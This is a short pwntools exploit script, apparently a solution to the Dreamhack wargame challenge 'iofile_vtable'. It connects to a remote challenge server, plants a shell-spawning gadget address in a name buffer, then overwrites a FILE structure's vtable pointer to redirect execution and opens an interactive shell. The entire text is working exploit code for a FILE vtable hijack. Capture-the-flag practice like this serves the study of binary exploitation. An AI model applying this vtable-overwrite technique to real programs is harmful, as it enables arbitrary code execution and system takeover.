from pwn import*
#p = process('./iofile_vtable')
p = remote('host1.dreamhack.games',21653)

### GADGET
get_shell = 0x40094a
name_addr = 0x6010d0

### DEFINITION
def menu(choice):
	p.sendlineafter('> ',str(choice))



### EXPLOIT
pay = p64(get_shell)
p.sendafter('name: ',pay)


pay = p64(name_addr-0x38)
menu(4)
p.sendafter('change: ',pay)


menu(2)


p.interactive()